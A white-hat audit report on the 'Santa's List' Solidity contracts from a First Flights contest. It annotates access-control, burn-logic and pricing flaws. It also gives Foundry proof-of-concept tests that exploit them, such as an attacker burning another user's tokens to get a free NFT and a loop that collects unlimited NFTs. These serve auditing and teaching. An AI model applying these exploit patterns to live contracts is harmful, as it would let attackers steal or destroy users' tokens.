# Santa's List - Audit Report

## Business Logic

Take a look at First-Flights's contest details


## Known Issues

Please head to First-Flights's contests Known-issues section

## Reconnaissance

- `SantasList.sol::SantasList`

```solidity
// @info: s_tokenCounter should have a observation API utility
uint256 private s_tokenCounter;

//...

// @info: 1703480381: Monday, December 25, 2023 at 4:59:41 AM
// @pitfall: arbitrum txs could be delayed upto 24hours
uint256 public constant CHRISTMAS_2023_BLOCK_TIME = 1_703_480_381;

//...

// @info: address parameters missing indexed keyword
event CheckedOnce(address person, Status status);
event CheckedTwice(address person, Status status);

//...

function checkList(address person, Status status) external {
    // @info: missing onlySanta modifier
    // @danger: anyone can add themselves into checked once list
    s_theListCheckedOnce[person] = status;
    emit CheckedOnce(person, status);
}

//...

function collectPresent() external {
    // @info: what about after christmas???
    // @issue: Dormant people can collect their present even after christmas eve
    // @res: https://docs.arbitrum.io/how-arbitrum-works/inside-arbitrum-nitro?utm_source=chatgpt.com#step-1-submitting-a-transaction
    if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
        revert SantasList__NotChristmasYet();
    }
    if (balanceOf(msg.sender) > 0) {
        revert SantasList__AlreadyCollected();
    }
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement();
        // console2.log("passedddddddd");
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement();
        i_santaToken.mint(msg.sender);
        return;
    }
    revert SantasList__NotNice();
}

//...

function buyPresent(address presentReceiver) external {
    // @info: missing purchase amount validation
    // @info: santa token allows only santaslist(this(contract)) to mint and burn
    // However presentReceiver has been passed
    // @issue: DoS
    // @Expectation: user -> approves 2e18 to santasList -> transferFrom(msg.sender(user), this(contract), 2e18) -> santasList burns santa token -> santasList mints nft for presentReceiver
    i_santaToken.burn(presentReceiver);
    _mintAndIncrement();
}

//...

function _mintAndIncrement() private {
    // @info: post increment in s_tokenCounter value
    // @question: how does solidity handle pre/post increment?
    // @guess: post increment means: First use then increment -> So first token would be 0
    // and tokenId = 0 helps to bypass a check above in collectPresent function
    // @issue: There may have DoS
    // @conclusion: intended behavior
    _safeMint(msg.sender, s_tokenCounter++);
}
```

- `SantaToken.sol::SantaToken`

```solidity
function mint(address to) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }

    console2.log("to          : ", to);
    console2.log("address this: ", address(this));
    console2.log("msg.sender  : ", msg.sender);
    // @info: only 1 token or 1e18 allowed to mint at once
    _mint(to, 1e18);
    console2.log("balanceOf(to): ", balanceOf[to]);
    console2.log("mint successfull..............................");
}

function burn(address from) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
    // @info: only 1 token or 1e18 allowed to burn at once
    // @info: buying a present costs 2e18 for an nft
    // so burn function should accept another argument called value
    _burn(from, 1e18);
}
```

## PoCs

- Place below PoCs into `./test/unitsSantasListTest.t.sol:SantasListTest`

```solidity
function testAnyoneCanPassIntoCheckList() public {
    vm.startPrank(user);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    SantasList.Status userStatus = santasList.getNaughtyOrNiceOnce(user);

    assertEq(uint256(SantasList.Status.EXTRA_NICE), 1);
    assertEq(uint256(userStatus), 1);
    assertEq(uint256(userStatus), uint256(SantasList.Status.EXTRA_NICE));
}

function testUsersCanCollectInfiniteSantaERC20TokenAndERC721NFTs() public {
    uint256 userNftBalanceBefore = santasList.balanceOf(user);
    uint256 userSantaTokenBalanceBefore = santaToken.balanceOf(user);

    assertEq(userNftBalanceBefore, 0);
    assertEq(userSantaTokenBalanceBefore, 0);

    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.warp(block.timestamp + santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.startPrank(user);
    santasList.collectPresent();
    vm.stopPrank();

    uint256 userNftBalanceAfter = santasList.balanceOf(user);
    uint256 userSantaTokenBalanceAfter = santaToken.balanceOf(user);

    console2.log("--------------------------------------------------------------------");
    console2.log("userNftBalanceBefore       : ", userNftBalanceBefore);
    console2.log("userSantaTokenBalanceBefore: ", userSantaTokenBalanceBefore);
    console2.log("userNftBalanceAfter        : ", userNftBalanceAfter);
    console2.log("userSantaTokenBalanceAfter : ", userSantaTokenBalanceAfter);

    assertEq(userNftBalanceAfter, 1);
    assertEq(userSantaTokenBalanceAfter, 1e18);

    address userSecond = makeAddr("USER SECOND");
    uint256 loopEnumerator;

    while (loopEnumerator < 1000) {
        vm.startPrank(user);
        santasList.transferFrom(user, userSecond, loopEnumerator);
        santasList.collectPresent();
        vm.stopPrank();
        loopEnumerator++;
    }

    console2.log("--------------------------------------------------------------------");
    console2.log("user nft balance after hecky collection      : ", santasList.balanceOf(user));
    console2.log("userSecond nft balance after hecky collection: ", santasList.balanceOf(userSecond));

    loopEnumerator = 0;
    while (santasList.balanceOf(userSecond) > 0) {
        vm.startPrank(userSecond);
        santasList.transferFrom(userSecond, user, loopEnumerator);
        vm.stopPrank();
        loopEnumerator++;
    }

    console2.log("--------------------------------------------------------------------");
    console2.log("user token balance final    : ", santaToken.balanceOf(user));
    console2.log("user nft balance final      : ", santasList.balanceOf(user));
    console2.log("userSecond nft balance final: ", santasList.balanceOf(userSecond));
}

function testAttackerCanMakeZeroAnyUsersSantaTokensAndGetFreeNFTs() public {
    address attacker = makeAddr("ATTACKER");

    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.warp(block.timestamp + santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.startPrank(user);
    santasList.collectPresent();
    vm.stopPrank();

    assertEq(santasList.ownerOf(0), user);
    assertEq(santaToken.balanceOf(user), 1e18);

    // attacker observes user's activity on block explorer

    vm.startPrank(attacker);
    santasList.buyPresent(user);
    vm.stopPrank();

    // So, user has pwned! ;`)

    assertEq(santasList.ownerOf(1), attacker);
    assertEq(santaToken.balanceOf(user), 0);
}

function testUserCanBuyPresentAt1ETHInsteadOf2ETH() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.warp(block.timestamp + santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.startPrank(user);
    santasList.collectPresent();
    vm.stopPrank();

    assertEq(santasList.ownerOf(0), user);
    assertEq(santaToken.balanceOf(user), 1e18);

    vm.startPrank(user);
    santasList.buyPresent(user);
    vm.stopPrank();
    assertEq(santaToken.balanceOf(user), 0);

    // Vulnerability traces...
    // `./src/SantasList.sol::SantasList` -> buyPresent -> missing PURCHASED_PRESENT_COST check -> i_santaToken.burn...
    // Main issue: `./src/SantaToken.sol::SantaToken` -> burn -> _burn(from, 1e18); <- hardcoded(magic number) amount
    // Even though, if there was PURCHASED_PRESENT_COST check available in buyPresent function, users would be able to buy present only with 1 ETH, possible due to the main issue above.
}

function testAllUsersAlreadyInCheckListSantaMayPassNonEligibleUsersToCheckTwiceList() public {
    vm.startPrank(santa);
    santasList.checkTwice(user, SantasList.Status.NICE);
    vm.stopPrank();

    vm.warp(block.timestamp + santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.startPrank(user);
    santasList.collectPresent();
    vm.stopPrank();

    assertEq(santasList.ownerOf(0), user);
}
```

- Open Bash and execute below:

```bash
forge test
```

- For specific PoC Run, Execute below:

```bash
forge test --mt testAllUsersAlreadyInCheckListSantaMayPassNonEligibleUsersToCheckTwiceList -vv
```WW




<br/>
<br/>
<br/>
<br/>
<br/>

##### Auditor|Sec-Res|White-Hat: *theirrationalone*